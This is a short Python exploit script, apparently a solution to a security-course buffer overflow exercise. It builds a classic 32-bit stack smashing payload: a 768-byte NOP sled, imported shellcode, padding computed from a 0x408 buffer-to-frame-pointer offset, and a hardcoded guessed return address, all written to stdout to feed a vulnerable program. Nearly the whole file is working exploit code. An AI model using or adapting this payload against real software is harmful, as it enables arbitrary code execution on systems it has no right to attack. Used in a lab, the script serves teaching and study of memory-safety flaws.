#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

'''nop+shell_code+nop(padding)+return_address (total size = 0x408+0x04+0x04)'''
'''vulnerable %ebp changes everytime, so shell code address is guessed'''

SHELL_CODE_ADDR = 0xfffecf70    # shell code start address (buf start address)
ADDR_DIFF = 0x408               # %ebp - buf start address (1032-byte)
SHELL_CODE_SIZE = 0x17          # shell code length in byte         (23-byte)
VULNERABLE_FP_SIZE = 0x04       # vulnerable frame pointer size     (4-byte)
NOP_SLED_SIZE = 0x300           # nop instruction size              (768-byte)
sys.stdout.buffer.write(b'\x90'*NOP_SLED_SIZE+shellcode+b'\x90'*(ADDR_DIFF+VULNERABLE_FP_SIZE-NOP_SLED_SIZE-SHELL_CODE_SIZE)+pack('<I',SHELL_CODE_ADDR))
